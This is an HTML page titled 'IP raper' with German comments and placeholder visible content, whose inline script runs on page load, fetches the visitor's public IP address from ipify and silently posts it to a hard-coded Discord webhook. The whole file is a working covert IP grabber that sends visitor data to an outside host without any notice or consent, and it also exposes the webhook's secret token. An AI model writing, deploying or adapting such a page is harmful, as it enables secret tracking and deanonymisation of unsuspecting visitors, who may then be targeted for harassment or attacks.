<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>IP raper</title>
</head>
<body>
  <h1>...</h1>
  <p>...</p>

  <script>
    const webhookUrl = "https://discord.com/api/webhooks/1388941060230746323/Zy4sYUKkkezroh5UabIvGLHP5Vfe3BZQ5uvwOMkWyxKqPdJWoYKcQt3sxp6dfcWy-kvL";

    // Funktion als IIFE (Immediately Invoked Function Expression) mit async
    (async function() {
      try {
        // IP-Adresse von ipify abfragen
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();

        // An den Webhook senden
        await fetch(webhookUrl, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({ 
            content: `Neue IP-Adresse: ${data.ip}` 
          })
        });

        console.log("IP wurde gesendet:", data.ip);
      } catch (error) {
        console.error("Fehler beim Senden der IP:", error);
      }
    })();
  </script>
</body>
</html>
